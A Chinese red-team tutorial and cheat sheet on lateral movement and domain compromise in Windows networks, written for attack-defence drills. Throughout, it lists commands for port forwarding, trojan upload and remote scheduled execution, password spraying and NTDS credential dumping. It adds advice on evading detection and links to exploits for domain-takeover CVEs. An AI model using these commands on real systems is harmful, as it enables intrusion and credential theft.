横向移动
================================

什么是内网横向攻击
--------------------------------
当通过外部打点进入到目标内网时，需要利用现有的资源尝试获取更多的凭证与权限，进而达到控制整个内网、拥有最高权限、发动 APT （高级持续性威胁攻击）等目地。
在攻防演练中，攻击方需要在有限的时间内近可能的获取更多的权限，因此必须具备高效的横向攻击思路。本次对内网横向攻击的技巧和方法进行总结。

注意事项
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 权限丢失
	webshell被发现，网站关站，木马后门被发现，主机改为不出网环境等。当遇到这些问题，需要做好应对措施，多方位的做好权限维持。
- 内网防火墙与杀毒软件
	内网防火墙，内网态势感知，内网流量监控，ids，ips等安全设备都会给横向攻击的开展造成很大的麻烦，应对措施有，对传输流量进行加密，修改cs流量特征，禁止大规模内网探测扫描等等。
- 内网蜜罐主机，蜜罐系统
	近年来攻防演练越来越多的防守方启用蜜罐主机，蜜罐系统，一旦蜜罐捕捉到攻击行为，并及时发现和处置，会导致权限丢失，前功尽弃。
- 运维管理人员
	内网横向攻击尽可能与运维管理人员的工作时间错开，尽量避免长时间登录administrator用户，如激活guest用户登录。降低被发现的几率。


windwos内网横穿
--------------------------------

常见端口
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 445
	- MS17-010，永恒之蓝
	- 远程本地认证：``net use \\192.168.1.2 /user:a\username password``
	- 其中a为域或工作组下的机器命名
+ 137/138/139
	- NetBios端口，137，138为UDP端口，用于内网传输文件
	- NetBios/SMB服务获取通过139端口
+ 135
	- 使用DCOM和RPC服务，用于WMI管理工具的远程操作
+ 53
	- DNS域传送漏洞
	- DNS协议隐秘传输
+ 389
	- LDAP
+ 88
	- Kerberos服务，监听KDC的票据请求，用户黄金票据和白银票据的伪造
+ 5985
	WinRM服务

端口转发
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ nc
	- 端口扫描
		+ 默认TCP：``nc -z -v -n 172.31.100.7 21-25``
	- 端口转发
		+ 将本地9000端口数据转发到192.168.100.2/8000：``mkfifo tmp/fifo|cat /tmp/fifo | nc 192.168.100.2 8000 | nc -l 9000 > /tmp/fifo`` 
		+ 访问：``nc -n 192.168.1.102 9000`` 
+ socat
	- 显示本地文件
		+ ``socat - /etc/sysctl.conf`` 
	- 监听本地端口
		+ ``socat TCP-LISTEN:12345 -`` 
	- UNIX DOMAIN域套接字转成TCP SOCKET
		+ ``socat TCP-LISTEN:12345,reuseaddr,fork UNIX-CONNECT:/data/deCOREIDPS/unix.domain`` 
	- 端口转发
		+ ``对于所有15000端口的TCP访问，一律转发到 server.wesnoth.org:15000 上`` 
		+ ``socat -d -d -lf /var/log/socat.log TCP4-LISTEN:15000,reuseaddr,fork,su=nobody TCP4:server.wesnoth.org:15000`` 
		+ ``tcp：nohup socat TCP4-LISTEN:2333,reuseaddr,fork TCP4:233.233.233.233:6666 >> /root/socat.log 2>&1 &`` 
		+ ``udp：nohup socat UDP4-LISTEN:2333,reuseaddr,fork UDP4:233.233.233.233:6666 >> /root/socat.log 2>&1 &`` 
+ netsh
	- 前提：IP Helper服务必须启动；管理员权限；
	- 查看已存在端口转发：``netsh interface portproxy show all``
	- 增加监听8888端口转发到3389端口：``netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectaddress=0.0.0.0 connectport=3389``
	- 删除转发端口：``netsh interface portproxy del v4tov4 listenport=8888 listenaddress=0.0.0.0``
	- 删除所有转发端口：``netsh interface portproxy reset``
+ portfwd
	- MSF自带工具
	- 将192.168.100.4的8888端口，映射到当前主机的8899端口
	- ``portfwd add -l 8899 -r 192.168.100.4 -p 8888``
+ proxychains
	- 修改配置/etc/proxychains.conf
		::
		
			[ProxyList]
			socks5 172.20.0.59 7222
	- 直接在程序前增加proxychains
	- ``sudo proxychains apt-get update``
	- 注意：socks代理不支持UDP协议，不支持icmp/ping协议，nmap使用受限。
+ frp
	- 官网下载：https://github.com/fatedier/frp/releases
	- 示例
		::
		
			跳板机（假设IP为172.20.0.59/192.168.100.3双网卡）上frps.ini配置：
			[common]
			bind_port = 7111
			
			执行命令：frps.exe -c frps.ini
			
			目标机器（假设IP为192.168.100.4/128.0.0.2双网卡）上frpc.ini配置：
			[common]
			server_addr = 192.168.100.3
			server_port = 7111

			[plugin_1]
			type = tcp
			remote_port = 7222
			plugin = socks5
			
			执行命令：frpc.exe -c frpc.ini
			
			这样再kali里面设置proxychains代理/etc/proxychains.conf：
			[ProxyList]
			socks5 172.20.0.59 7222
			在172.20.0.1/24网段机器使用nmap直接对内网128网段进行扫描：
			proxychains nmap -sT -Pn -p- 128.0.0.1/24
	- 相关问题
		+ frpc客户端连接会提示 login to server failed: EOF
			::
			
				修改frpc.ini文件，在common节点，添加tls_enable = true
+ NPS【综合】
	- 一款轻量级、高性能、功能强大的内网穿透代理服务器。支持tcp、udp、socks5、http等几乎所有流量转发。
	- 访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析、内网socks5代理等等，并带有功能强大的web管理端。
	- 项目地址：``https://github.com/ehang-io/nps``
	- 帮助文档：``https://ehang.io/nps/documents``
+ Goproxy 【综合】
	- Goproxy 是 golang 实现的高性能 http ,https ,websocket ,tcp ,socks5 代理服务器。
	- 项目地址：``https://github.com/snail007/goproxy``
	- 帮助文档：``https://snail007.host900.com/goproxy/manual/zh/#/``
+ Stowaway【多级】
	- Stowaway是一个利用go语言编写、专为渗透测试工作者制作的多级代理工具。
	- 项目地址：``https://github.com/ph4ntonn/Stowaway``
+ Neo-reGeorg【Webshell】
	- Neo-reGeorg 是一个旨在积极重构 reGeorg 的项目。
	- 项目地址：``https://github.com/L-codes/Neo-reGeorg``

IPC$共享利用
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 介绍：IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，也就是两个进程之间可以利用它产生数据交互，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。
+ 利用条件
	- SMB协议（445端口）开启
	- NETBios（139端口）开启
	- 弱口令：暴力破解
+ 常用命令
	::
	
		#建立空连接
		net use \\127.0.0.1\ipc$ "" /user:""
		权限很低，基本没什么用，在Windows2003以后，空连接什么权限都没有；
		有些主机的 Administrator 管理员的密码为空，那么我们可以尝试连接；但是默认的服务器配置也会阻止空密码的连接。

		#建立完整的用户名，密码连接
		net use \\127.0.0.1\ipc$ "password" /user:"username"

		#删除IPC$连接
		net use \\127.0.0.1\ipc$ /del

		#映射路径  (将对方的c盘映射为自己的z盘，其他盘类推)
		net use z: \\127.0.0.1\c$ "密码" /user:"用户名"

		#访问/删除路径
		net use z: \\127.0.0.1\c$   #直接访问
		net use c: /del     #删除映射的c盘
		net use * /del      #删除全部,会有提示要求按y确认


		#域中相关命令
		net use\\去连接的IP地址\ipc$ "域成员密码"  /user:域名\域成员账号
		net use\\192.168.100.1\ipc$ "admin123.." /user:momaek.com\win2003

		dir \\momaek.com\c$

		copy test.exe \\momaek.com\c$

		net use \\192.168.100.1\ipc$ /del

		net share       #查看自己的共享
		net view \\IP   #查看target-IP的共享
		netstat -A IP   #获取target-IP的端口列表

		netstat -ano | findstr "port"  #查看端口号对应的PID
		tasklist | findstr "PID"       #查看进程号对应的程序

+ 利用方式
	- 构建连接: ``net use \\127.0.0.1\IPC$ "" /user:"admintitrators"``
	- 上传木马: ``copy test.exe \\127.0.0.1\admin$``
	- 查看时间: ``net time \\127.0.0.1``
	- 创建定时任务: ``at \\127.0.0.1 11:05 test.exe``
+ 其它
	- 查看文件: ``dir \\192.168.52.130\c$``
	- 盘符映射: ``net use k: \\192.168.52.130\c$ /u:"administrator" "123456"``
	- 查看进程: ``tasklist /S 192.168.52.130 /U administrator -P 123456``
	- 执行定时任务: ``at \\192.168.135.5 13:20:00 cmd.exe /c "c:\beacon.exe"``
	- 执行定时任务
		::
			
			schtasks /create /s 192.168.52.130 /u administrator /p 123456 /tn test_crow /tr c:/artifact.exe  /sc once /st 15:29
			schtasks /query /s 192.168.52.130 /u administrator /p 123456 /tn test_crow
			在目标主机上创建一个名为test_crow的计划任务，启动程序为c:/beacon.exe ，启动权限为system，启动时间为每隔一小时启动一次
			schtasks /create /s 192.168.52.130 /u administrator /p 123456 /tn test_crow /sc HOURLY /mo 1 /tr c:/test.exe /ru system /f
			其他启动时间参数：
			/sc onlogon  用户登录时启动
			/sc onstart  系统启动时启动
			/sc onidle   系统空闲时启动
			#删除任务计划
			schtasks /delete /s 192.168.52.130 /u administrator /p 123456 /tn test_crow 

域渗透
--------------------------------

域
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
域指将网络中多台计算机逻辑上组织到一起，进行集中管理的逻辑环境。域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。

+ Active Directory
	- 活动目录（AD）是面向Windows Server的目录服务。Active Directory存储了有关网络对象的信息，并且让管理员和用户能够查找和使用这些信息。

+ NTLM认证
	- NTLM是NT LAN Manager的缩写，NTLM是基于挑战/应答的身份验证协议，是 Windows NT 早期版本中的标准安全协议，基本流程为：

	::
	
		客户端在本地加密当前用户的密码成为密码散列
		客户端向服务器明文发送账号
		服务器端产生一个16位的随机数字发送给客户端，作为一个challenge
		客户端用加密后的密码散列来加密challenge，然后返回给服务器，作为response
		服务器端将用户名、challenge、response发送给域控制器
		域控制器用这个用户名在SAM密码管理库中找到这个用户的密码散列，然后使用这个密码散列来加密chellenge
		域控制器比较两次加密的challenge，如果一样那么认证成功，反之认证失败

+ kerboser认证
	- 见认证机制章中Kerberos一节。

+ Pass The Hash
	- Pass The Hash (PtH) 是攻击者捕获帐号登录凭证后，复用凭证Hash进行攻击的方式。

+ Pass The Key

判断是否有域
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ systeminfo
	- ``systeminfo | findstr 域:``
	- ``此方法获取到域名信息``
+ net time方法
	::

		1.存在域，但当前用户不是域用户，提示说明权限不够
			C:\Users>bypass>net time /domain
			发生系统错误 5 
			拒绝访问。

		2.存在域，并且当前用户是域用户
			C:\Users\Administrator>net time /domain
			\\dc.test.com 的当前时间是 2020/10/23 21:18:37
			
			命令成功完成。
		注：dc即域控主机的计算机名。

		3.当前网络环境为工作组，不存在域
			C:\Users\Administrator>net time /domain
			找不到域 WORKGROUP 的域控制器。

搜集域信息
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ meterpreter：``run post/windows/gather/enum_domain``
+ NSE脚本
	- smb-enum-domains.nse:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等
	- smb-enum-users.nse:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描
	- smb-enum-shares.nse:遍历远程主机的共享目录
	- smb-enum-processes.nse:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件
	- smb-enum-sessions.nse:获取域内主机的用户登陆会话，查看当前是否有用户登陆，且不需要管理员权限
	- smb-os-discovery.nse:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息
+ 查看域
	- 查看域名列表：``net view /domain``
	- 查看域test主机列表：``net view /domain:test``
	- 注：computer browser服务未启动，net view命令报6118错误。
+ 查看域内用户组列表：``net group /domain``
+ 查看域内用户组信息：``net group "Enterprise Admins" /domain``
+ 查看域密码策略信息：``net accounts /domain``
+ 查看域信任信息：``nltest /domain_trusts``

域控主机IP
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ ipconfig查看dns服务器地址
+ nslookup 域名
+ ping 域名

搜集域用户和管理员信息
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 当前当前主机当前登录的域和用户：``net config workstation``
+ 查询域用户列表：``net user /domain``
+ 查询域用户详细信息：``wmic useraccount get /all``

查找域控制器
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 查看域控制器主机名
	- ``nltest /DCLIST:teamssix``
	- ``nslookup -type=SRV _ldap._tcp``
	- ``netdom query pdc``
	- ``nbtstat -A 127.0.0.1``
+ 查看域控制器组：``net group "domain controllers" /domain``
+ 定位域管理员
	- PsLoggedOn：``https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon``
	- PowerView
		+ Recon目录下：``https://github.com/PowerShellMafia/PowerSploit/``
		+ 打开powershell命令行
		+ 执行 ``Import-Module PowerView.ps1``
		+ 执行 ``Invoke-UserHunter``
		+ 主要模块
			::
			
				Get-NetDomain:获取当前用户所在域名称
				Get-NetUser：获取所有用户的详细信息
				Get-NetDomainController：获取所有域控制器的信息
				Get-NetComputer：获取域内所有机器的详细信息
				Get-NetOU：获取域中的OU信息
				Get-NetGroup：获取所有域内组和组成员信息
				Get-NetFileServer：根据SPN获取当前域使用的文件服务器信息
				Get-NetShare：获取当前域内所有的网络共享信息
				Get-NetSession：获取指定服务器的会话
				Get-NetRDPSession：获取指定服务器的远程连接
				Get-NetProcess：获取远程主机的进程
				Get-UserEvent：获取指定用户的日志
				Get-ADObject：获取活动目录的对象
				Get-NetGPO：获取域内所有组的策略对象
				Get-DomainPolicy：获取域默认策略或域控制器策略
				Invoke-UserHunter：获取域用户登陆的计算机信息及该用户是否有本地管理员权限
				Invoke-ProcessHunter：通过查询域内所有的机器进程找到特定用户
				Invoke-UserEventHunter：根据用户日志查询某域用户登陆过哪些域机器
	- ADFindUsersLoggedOn
		+ ``https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn``
		+ ``PVEFindADUser.exe -current``

获取域用户hash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ :ref:`intranet/winpersistence:凭证窃取`

相关漏洞
--------------------------------

可直接拿域控
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ ms17-010(CVE-2017-0143)：永恒之蓝
+ MS14-068(CVE-2014-6324)
	- Kerberos 校验和漏洞：用户在向 Kerberos 密钥分发中心（KDC）申请TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos 票据
	- 利用条件
		+ 小于2012R2的域控 没有打MS14-068的补丁(KB3011780)
		+ 拿下一台加入域的计算机
		+ 有这台域内计算机的域用户密码和Sid
	- 利用效果：将任意域用户提升到域管权限
	- 相关EXP
		+ https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068
		+ https://github.com/Al1ex/WindowsElevation
+ CVE-2020-1472
	- 可将域控机器用户的password设置为空
	- 利用效果：可利用此漏洞获取域管访问权限
	- 影响版本
		::
		
			Windows Server 2008 R2 for x64-based Systems Service Pack 1
			Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
			Windows Server 2012Windows Server 2012 (Server Core installation)
			Windows Server 2012 R2Windows Server 2012 R2 (Server Core installation)
			Windows Server 2016Windows Server 2016 (Server Core installation)
			Windows Server 2019Windows Server 2019 (Server Core installation)
			Windows Server, version 1903 (Server Core installation)
			Windows Server, version 1909 (Server Core installation)Windows Server, version 2004 (Server Core installation)
	- 风险：导致目标主机脱域
	- 相关EXP
		+ Impacket工具包：https://github.com/SecureAuthCorp/impacket.git
		+ 检查是否存在漏洞：https://github.com/SecuraBV/CVE-2020-1472.git
		+ exp：https://github.com/dirkjanm/CVE-2020-1472
		+ exp：https://github.com/risksense/zerologon
		+ https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472
+ CVE-2021-42287&42278
	- AD域计算机账户认证漏洞：攻击者可利用该漏洞造成将域内的普通用户权限提升到域管理员权限
	- 利用效果：将任意域用户提升到域管权限
	- 影响版本
		::
		
			Windows Server 2012 R2 (Server Core installation)
			Windows Server 2012 R2
			Windows Server 2012 (Server Core installation)
			Windows Server 2012
			Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
			Windows Server 2008 R2 for x64-based Systems Service Pack 1
			Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
			Windows Server 2008 for x64-based Systems Service Pack 2
			Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
			Windows Server 2008 for 32-bit Systems Service Pack 2
			Windows Server 2016 (Server Core installation)
			Windows Server 2016
			Windows Server, version 20H2 (Server Core Installation)
			Windows Server, version 2004 (Server Core installation)
			Windows Server 2022 (Server Core installation)
			Windows Server 2022
			Windows Server 2019 (Server Core installation)
			Windows Server 2019
	- 利用条件
		+ 一个普通域成员帐户
		+ 域用户有创建机器用户的权限（一般默认权限）
		+ DC未打补丁KB5008380或KB5008602
	- 相关EXP
		+ https://github.com/WazeHell/sam-the-admin
		+ https://github.com/cube0x0/noPac
+ CVE-2021-1675/CVE-2021-34527
	- Windows Print Spooler权限提升漏洞
	- 利用效果：未经身份验证的远程攻击者可利用该漏洞以SYSTEM权限在域控制器上执行任意代码，从而获得整个域的控制权
	- 影响版本
		::
		
			Windows Server 2012 R2 (Server Core installation)
			Windows Server 2012 R2
			Windows Server 2012 (Server Core installation)
			Windows Server 2012
			Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
			Windows Server 2008 R2 for x64-based Systems Service Pack 1
			Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
			Windows Server 2008 for x64-based Systems Service Pack 2
			Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
			Windows Server 2008 for 32-bit Systems Service Pack 2
			Windows RT 8.1
			Windows 8.1 for x64-based systems
			Windows 8.1 for 32-bit systems
			Windows 7 for x64-based Systems Service Pack 1
			Windows 7 for 32-bit Systems Service Pack 1
			Windows Server 2016 (Server Core installation)
			Windows Server 2016
			Windows 10 Version 1607 for x64-based Systems
			Windows 10 Version 1607 for 32-bit Systems
			Windows 10 for x64-based Systems
			Windows 10 for 32-bit Systems
			Windows Server, version 20H2 (Server Core Installation)
			Windows 10 Version 20H2 for ARM64-based Systems
			Windows 10 Version 20H2 for 32-bit Systems
			Windows 10 Version 20H2 for x64-based Systems
			Windows Server, version 2004 (Server Core installation)
			Windows 10 Version 2004 for x64-based Systems
			Windows 10 Version 2004 for ARM64-based Systems
			Windows 10 Version 2004 for 32-bit Systems
			Windows 10 Version 21H1 for 32-bit Systems
			Windows 10 Version 21H1 for ARM64-based Systems
			Windows 10 Version 21H1 for x64-based Systems
			Windows 10 Version 1909 for ARM64-based Systems
			Windows 10 Version 1909 for x64-based Systems
			Windows 10 Version 1909 for 32-bit Systems
			Windows Server 2019 (Server Core installation)
			Windows Server 2019
			Windows 10 Version 1809 for ARM64-based Systems
			Windows 10 Version 1809 for x64-based Systems
			Windows 10 Version 1809 for 32-bit Systems
	- 利用条件
		+ 目标开启Spooler服务；
		+ 一个普通权限的域账户；
		+ 创建的smb服务允许匿名访问，即目标可以直接获取到文件。
	- 相关EXP
		+ https://github.com/cube0x0/CVE-2021-1675
		+ https://github.com/calebstewart/CVE-2021-1675
		+ https://github.com/numanturle/PrintNightmare
+ CVE-2019-1040
	- Microsoft Windows NTLM认证漏洞
	- 利用效果：攻击者在仅有一个普通域账号的情况下可以远程控制 Windows 域内的任何机器，包括域控服务器。
	- 影响版本
		::
			
			Windows 7 sp1 至Windows 10 1903
			Windows Server 2008 至Windows Server 2019
	- 利用条件
		+ Exchange服务器可以是任何版本。唯一的要求是，在以共享权限或RBAC模式安装，Exchange默认具有高权限。
		+ 域内任意账户。
		+ CVE-2019-1040漏洞的实质是NTLM数据包完整性校验存在缺陷，故可以修改NTLM身份验证数据包而不会使身份验证失效。而此攻击链中攻击者删除了数据包中阻止从SMB转发到LDAP的标志。
		+ 构造请求使Exchange Server向攻击者进行身份验证，并通过LDAP将该身份验证中继到域控制器，即可使用中继受害者的权限在Active Directory中执行操作。比如为攻击者帐户授予DCSync权限。
		+ 如果在可信但完全不同的AD林中有用户，同样可以在域中执行完全相同的攻击。
	- 攻击链
		+ 使用域内任意帐户，通过SMB连接到被攻击ExchangeServer，并指定中继攻击服务器。同时必须利用SpoolService错误触发反向SMB链接。
		+ 中继服务器通过SMB回连攻击者主机，然后利用ntlmrelayx将利用CVE-2019-1040漏洞修改NTLM身份验证数据后的SMB请求据包中继到LDAP。
		+ 使用中继的LDAP身份验证，此时Exchange Server可以为攻击者帐户授予DCSync权限。
		+ 攻击者帐户使用DCSync转储AD域中的所有域用户密码哈希值（包含域管理员的hash，此时已拿下整个域）。
	- 利用方式
		+ https://github.com/Ridter/CVE-2019-1040
		+ https://github.com/SecureAuthCorp/impacket
		+ https://github.com/dirkjanm/krbrelayx
		+ https://github.com/Ridter/CVE-2019-1040
		+ https://github.com/Ridter/CVE-2019-1040-dcpwn
	- 参考资料
		+ 同一网段内：https://www.freebuf.com/vuls/274091.html
		+ 隧道下：https://zhuanlan.zhihu.com/p/142080911
+ 域委派攻击
	- https://mp.weixin.qq.com/s/GdmnlsKJJXhElA4GuwxTKQ
+ NTLM Relay
	- https://www.anquanke.com/post/id/193149
	- https://www.anquanke.com/post/id/193493
	- https://www.anquanke.com/post/id/194069
	- https://www.anquanke.com/post/id/194514
+ ADCS漏洞–ESC8(PetitPotam)(ADCS relay)
	- ESC8是一个http的ntlm relay，原因在于ADCS的认证中支持NTLM认证
	- 攻击效果：将普通域用户提升到域管权限
	- 利用条件
		+ 未打adcs的补丁
		+ 有两台域控
		+ 有adcs服务
	- 利用方式
		+ https://blog.csdn.net/qq_43645782/article/details/119322322
		+ https://forum.butian.net/share/1583
+ ADCS漏洞–CVE-2022–26923
	- 通过构造机器账户并篡改dNSHostName属性，在证书申请时AD CS将dNSHostName属性嵌入证书中，进而机器账户获得高权限的域控身份。
	- 攻击效果：允许低权限用户在安装了 Active Directory 证书服务 (AD CS) 服务器角色的默认 Active Directory 环境中将权限提升到域管理员。
	- 影响版本
		+ Windows 8.1
		+ Windows 10 Version 1607, 1809,1909, 2004, 20H2, 21H1, 21H2
		+ Windows 11
		+ Windows Server 2008，2012，2016，2019，2022
	- 利用条件
		+ 该提权漏洞适用于所有的Windows服务器活动目录版本，包含目前位于微软产品支持范围内的Windows Server 2012 R2到Windows Server 2022，以及超出产品支持范围的旧Windows服务器版本。
		+ 入侵者至少控制一个活动目录用户账户，该用户账户对于活动目录中至少一个计算机账户具有“Validated write to DNS host name”权限。默认情况下，单个活动目录普通域用户可以加入或创建（包含创建空账户）10个计算机账户到活动目录中，并对自己所加入/创建的计算机账户具有CREATOR OWNER管理权限（包含“Validated write to DNShost name”权限）。因此该权限较为容易获得。
		+ 在活动目录内部部署有企业证书服务，并允许上述被控制的计算机账户申请计算机身份验证证书。企业证书服务是活动目录中广泛部署的一种相关基础服务，并且默认情况下，与活动目录集成的企业证书服务默认即允许域内计算机申请计算机身份验证证书。
	- 参考资料
		+ https://forum.butian.net/share/1578
		+ https://forum.butian.net/share/1583

可控制Exchange服务器
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CVE-2018-8581
	- Microsoft Exchange任意用户伪造漏洞
	- https://github.com/Ridter/Exchange2domain
	- https://github.com/WyAtu/CVE-2018-8581
+ CVE-2020-0688
	- Microsoft Exchange 反序列化RCE
	- https://github.com/zcgonvh/CVE-2020-0688

+ CVE-2021-26855/CVE-2021-27065
	- Exchange ProxyLogon远程代码执行漏洞
	- https://github.com/hausec/ProxyLogon
+ CVE-2020-17144
	- Microsoft Exchange 远程代码执行漏洞
	- 利用条件：Exchange2010
	- https://github.com/Airboi/CVE-2020-17144-EXP
+ CVE-2020-16875
	- Microsoft Exchange 远程代码执行漏洞
	- https://srcincite.io/pocs/cve-2020-16875.py.txt
+ CVE-2021-34473
	- Exchange ProxyShell SSRF
	- https://github.com/dmaasland/proxyshell-poc
+ CVE-2021-33766
	- Exchange ProxyToken 信息泄露漏洞
	- https://github.com/bhdresh/CVE-2021-33766-ProxyToken

相关工具
--------------------------------

内网扫描
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ auxiliary/scanner/discovery/udp_sweep    #基于udp协议发现内网存活主机
+ auxiliary/scanner/discovery/udp_probe    #基于udp协议发现内网存活主机
+ auxiliary/scanner/netbios/nbname         #基于netbios协议发现内网存活主机
+ auxiliary/scanner/portscan/tcp           #基于tcp进行端口扫描
+ nmap端口扫描

CrackMapExec 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 介绍：域环境（活动目录）渗透测试中一站式便携工具，列举登录用户、通过SMB(Server Message Block)网络文件共享协议爬虫列出SMB分享列表。执行类似于Psexec的攻击、使用powerShell脚本执行自动式Mimikatz/Shellcode/DLL注入到内存中，dump NTDS.dit密码。
+ 地址：``https://github.com/byt3bl33d3r/CrackMapExec``
+ 安装
	::
	
		最方便：
		apt-get install crackmapexec
		避免有坑：
		apt-get install -y libssl-dev libffi-dev python-dev build-essential
		pip install --user pipenv
		git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
		cd CrackMapExec && pipenv install
		pipenv shell
		python setup.py install
+ 说明
	- 帮助：``crackmapexec --help``
	- 根据协议获取帮助信息：``crackmapexec smb --help``
	- protocol：``ftp,smb,ssh,winrm,ldap,rdp,mssql``
	- 基本探测
		::
		
			crackmapexec [protocol] test.com
			crackmapexec [protocol] 192.168.3.70/24
			crackmapexec [protocol] 192.168.3.70-77  192.168.4.1-20
			crackmapexec [protocol] ~/ip.txt
	- 携带认证信息
		::
		
			crackmapexec [protocol] 192.168.3.70 -u administrator -p 'admin!@#45'
			携带hash：
			-H HASH [HASH ...], --hash HASH [HASH ...] NTLM hash(es) or file(s) containing NTLM hashes
	- 协议探测：``crackmapexec  smb 192.168.3.73-76``
	- 密码喷射
		::
		
			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45'
			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45' 'Admin12345'
			crackmapexec smb 192.168.3.73-144 -u administrator  sqladmin -p 'admin!@#45' 'Admin12345'
			crackmapexec smb 192.168.3.73-144 -u ~/name.txt -p ~/pass.txt
			crackmapexec smb 192.168.3.73-144 -u ~/name.txt -H ~/ntlmhash.txt
			crackmapexec smb 192.168.3.73-144 -u user -H 'NTHASH'
			crackmapexec smb 192.168.3.73-144 -u user -H 'LMHASH:NTHASH'
	- 执行命令：``crackmapexec smb 192.168.3.144 -u administrator -p 'admin!@#45' -x whoami``
	- 凭证获取
		::
		
			crackmapexec smb 192.168.3.144 -u administrator -p 'admin!@#45' --sam
			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45' --lsa
			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45' --ntds
			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45' --ntds vss
			crackmapexec smb 192.168.3.73-144 -u administrator -p 'admin!@#45' --ntds-history
	- Sessions枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --sessions``
	- 共享枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --shares``
	- 磁盘枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --disk``
	- 登录用户枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --loggedon-users``
	- RID爆破枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --rid-brute``
	- 域用户枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --users``
	- 组枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --groups``
	- 本地组枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --local-groups``
	- 域密码策略枚举：``crackmapexec smb 192.168.3.76-144 -u administrator -p 'admin!@#45' --pass-pol``

Impackt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 安装
	- git clone https://github.com/CoreSecurity/impacket.git
	- cd impacket/
	- python setup.py install
+ 通用选项
	- 密码认证连接：``python3 xxx.py [域]/[用户名]:[密码]@[目标ip]``
	- hash认证连接：``python3 xxx.py [域]/[用户名]@ip -hashes :161cff084477fe596a5db81874498a24``
	- Kerberos认证：``export KRB5CCNAME=ad01.ccache ``,``python3 xxx.py -k -no-pass``
	- 指定目标IP：``-target-ip 192.168.40.156``
	- 指定域控IP：``-dc-ip 192.168.40.156``
+ psexec.py
	- 类似PSEXEC的功能示例，使用remcomsvc（https://github.com/kavika13/remcom）。
+ smbexec.py：
	- 与使用remcomsvc的psexec w/o类似的方法。这里描述了该技术。实例化本地smbserver以接收命令的输出。这在目标计算机没有可写共享可用的情况下很有用。
+ atexec.py
	- 通过Task Scheduler服务在目标计算机上执行命令，并返回已执行命令的输出。
+ wmiexec.py
	- 通过Windows Management Instrumentation使用的半交互式shell，它不需要在目标服务器上安装任何服务/代理，以管理员身份运行，非常隐蔽。
+ dcomexec.py
	- 类似于wmiexec.py的半交互式shell，但使用不同的DCOM端点。目前支持MMC20.Application，ShellWindows和ShellBrowserWindow对象。
+ GetTGT.py
	- 指定密码，哈希或aesKey，此脚本将请求TGT并将其保存为ccache。
+ GetST.py
	- 指定ccache中的密码，哈希，aesKey或TGT，此脚本将请求服务票证并将其保存为ccache。如果该帐户具有约束委派（具有协议转换）权限，您将能够使用-impersonate参数代表另一个用户请求该票证。
+ GetPac.py
	- 获得指定目标用户的PAC（权限属性证书）结构，该结构仅具有正常的经过身份验证的用户凭据。它通过混合使用[MS-SFU]的S4USelf +用户到用户Kerberos身份验证组合来实现的。
+ GetUserSPNs.py
	- 查找和获取与普通用户帐户关联的服务主体名称。
+ GetNPUsers.py
	- 尝试为那些设置了属性“不需要Kerberos预身份验证”的用户获取TGT（UF_DONT_REQUIRE_PREAUTH)。
+ ticketer.py
